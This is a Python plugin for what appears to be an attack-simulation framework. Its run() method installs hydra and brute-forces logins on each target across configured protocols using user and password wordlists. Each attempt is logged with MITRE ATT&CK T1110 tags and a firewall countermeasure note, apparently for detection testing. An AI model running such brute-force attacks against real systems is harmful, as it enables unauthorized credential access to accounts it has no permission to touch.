#!/usr/bin/env python3

# A plugin for hydra bruteforce attacks

from plugins.base.attack import AttackPlugin


class HydraPlugin(AttackPlugin):

    # Boilerplate
    name = "hydra"
    description = "A plugin controlling the hydra brute forcing tool"
    ttp = "T1110"
    tactics_id = "T1110.003"
    tactics = "Credential access"
    references = ["https://attack.mitre.org/techniques/T1110/"]

    required_files_attacker = ["passwords.txt", "users.txt"]    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__

    def run(self, targets):
        """ Run the command

        @param targets: A list of targets
        """

        # Set defaults if not present in config
        playground = self.attacker_machine_plugin.get_playground()
        total_res = ""

        # Generate command
        cmd = f"cd {playground};"
        cmd += "sudo apt -y install hydra;"
        for t in targets:
            for p in self.conf['protocols']:
                cmd += f"hydra -L {self.conf['userfile']}  -P {self.conf['pwdfile']} {p}://{t.get_ip()};"
                logid = self.attack_logger.start_kali_attack(source=self.attacker_machine_plugin.get_ip(),
                                                             target=t.get_ip(),
                                                             attack_name=self.name,
                                                             ttp=self.ttp,
                                                             name="Hydra brute force",
                                                             tactics=self.tactics,
                                                             tactics_id=self.tactics_id,
                                                             description="Hydra can brute force accounts/passwords for different protocols",
                                                             situation_description=f"Hydra attack on {t.get_ip()}, protocol: {p}",
                                                             countermeasure="Statistics at the firewall. Close connections with too many failed connection attempts.",
                                                             kali_command=cmd
                                                             )
                res = self.attacker_run_cmd(cmd) or ""
                total_res += res
                self.attack_logger.stop_kali_attack(source=self.attacker_machine_plugin.get_ip(),
                                                    target=t.get_ip(),
                                                    attack_name=self.name,
                                                    ttp=self.ttp,
                                                    logid=logid)
                cmd = f"cd {playground};"

        return total_res
